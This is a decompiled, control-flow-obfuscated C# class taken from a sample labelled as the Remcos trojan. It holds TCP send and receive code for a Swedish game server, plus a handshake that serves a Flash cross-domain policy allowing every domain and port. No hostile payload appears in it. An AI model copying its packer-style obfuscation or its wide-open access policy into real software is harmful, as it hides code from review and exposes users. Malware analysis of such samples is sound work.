// Decompiled with JetBrains decompiler
// Type: Vändtia_Live_Server.Player1
// Assembly: W2E901dpqsgg43z, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: E3EDE543-33A5-3966-9367-08505E2DD4BA
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan.MSIL.Remcos.gen-9a55287be3d6c8a74a0aa6ee3a5ea4e288ba968e44c271c9ea5d2293c8300d07.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Net.Sockets;
using System.Text;
using Vändtia_Live_Server.My;

namespace Vändtia_Live_Server
{
  public class Player1
  {
    public string Name;
    public TcpClient Client;
    public NetworkStream Stream;
    public bool Finished;

    public Player1() => this.Finished = false;

    public void Send(string Text)
    {
      try
      {
        Console.WriteLine("Skickar till " + this.Name + ": " + Text);
label_3:
        int num = 11;
        byte[] bytes;
        while (true)
        {
          switch (num ^ 53)
          {
            case 59:
              Text += "\0";
              num = 117;
              continue;
            case 60:
              this.Stream.Write(bytes, 0, bytes.Length);
              num = 10;
              continue;
            case 61:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Player1.SendHandshake);
              num = 8;
              continue;
            case 62:
              num = 14;
              continue;
            case 63:
              num = 116;
              continue;
            case 64:
              bytes = Encoding.UTF8.GetBytes(Text);
              num = 9;
              continue;
            case 65:
              goto label_18;
            default:
              goto label_3;
          }
        }
label_18:;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Exception exception = ex;
label_13:
        int num1 = AsciiSnake.\uE408\uF03E\uE1B2\uF83C\uE1B5\uEB23\uF0B7\uEA31\uF287\uEA34\uE6A2\uF14E(40);
        while (true)
        {
          switch ((num1 ^ 58) + 48)
          {
            case 0:
              int num2 = (int) Interaction.MsgBox((object) ("Gick inte att skicka datat till " + this.Name + "\r\n" + exception.Message));
              num1 = -21;
              continue;
            case 1:
              ProjectData.ClearProjectError();
              num1 = -18;
              continue;
            case 2:
              num1 = Level.\uF445\uECD1\uEEF4\uE532\uF4BA\uF682\uE473\uEA2E\uF56A\uF26A\uE5BB\uEAF4(64);
              continue;
            case 3:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle = __methodref (Player1.\u002Ector);
              num1 = -23;
              continue;
            case 4:
              goto label_10;
            default:
              goto label_13;
          }
        }
label_10:;
      }
    }

    public string Recieve()
    {
      string str;
      try
      {
        byte[] numArray = new byte[checked (this.Client.ReceiveBufferSize + 1)];
label_8:
        int num1 = 120;
        int num2 = 6;
        while (true)
        {
          switch (num2 ^ 71)
          {
            case 62:
              switch (num1)
              {
                case 69:
                  str = Encoding.UTF8.GetString(numArray).Trim(new char[1]);
                  num1 = 116;
                  goto label_2;
                case 70:
                  this.Stream.Read(numArray, 0, this.Client.ReceiveBufferSize);
                  num1 = 121;
                  goto label_2;
                case 71:
                  Console.WriteLine(this.Name + " säger: " + Encoding.UTF8.GetString(numArray).Trim(new char[1]));
                  num1 = 118;
                  goto label_2;
                case 72:
                  num1 = 123;
                  goto label_2;
                case 73:
                  // ISSUE: method reference
                  RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player1.SendHandshake);
                  num1 = 119;
                  goto label_2;
                case 74:
                  goto label_15;
                default:
                  num2 = 7;
                  continue;
              }
            case 63:
              // ISSUE: method reference
              RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player1.SendHandshake);
              num2 = 120;
              continue;
            case 64:
              goto label_8;
            case 65:
label_2:
              num1 ^= 62;
              break;
          }
          num2 = 121;
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        str = "";
        ProjectData.ClearProjectError();
      }
label_15:
      return str;
    }

    public void SendHandshake()
    {
label_7:
      int num1 = 126;
      int num2 = -6;
      while (true)
      {
        switch ((num2 ^ 69) + 68)
        {
          case 0:
            // ISSUE: method reference
            RuntimeMethodHandle runtimeMethodHandle1 = __methodref (Player1.SendHandshake);
            num2 = -7;
            continue;
          case 1:
            string Text;
            switch (num1)
            {
              case 60:
                num1 = 3;
                goto label_1;
              case 61:
                Text = "<?xml version=\"1.0\"?><!DOCTYPE cross-domain-policy SYSTEM \"/xml/dtds/cross-domain-policy.dtd\"><cross-domain-policy><site-control permitted-cross-domain-policies=\"all\"/><allow-access-from domain=\"*\" to-ports=\"*\" /></cross-domain-policy>";
                num1 = 125;
                goto label_1;
              case 62:
                this.Send(Text);
                num1 = (int) sbyte.MaxValue;
                goto label_1;
              case 63:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle2 = __methodref (Player1.Recieve);
                num1 = 124;
                goto label_1;
              case 64:
                goto label_11;
              default:
                num2 = -5;
                continue;
            }
          case 2:
            goto label_7;
          case 3:
label_1:
            num1 ^= 67;
            break;
        }
        num2 = \uE847\uECAC\uE5EA\uE594\uE61D\uF865\uF65E\uF025\uEE4F\uF357\uE1B2\uE961.\uEC90\uE830\uED92\uEA5B\uF4EC\uE676\uF441\uE7AB\uE952\uF03A\uEEBD\uEFF1.\uEEF5\uEA0C\uEADA\uE1C9\uE289\uEDEB\uE9AB\uE1F5\uE72E\uE67B\uF500\uE550(41);
      }
label_11:;
    }
  }
}
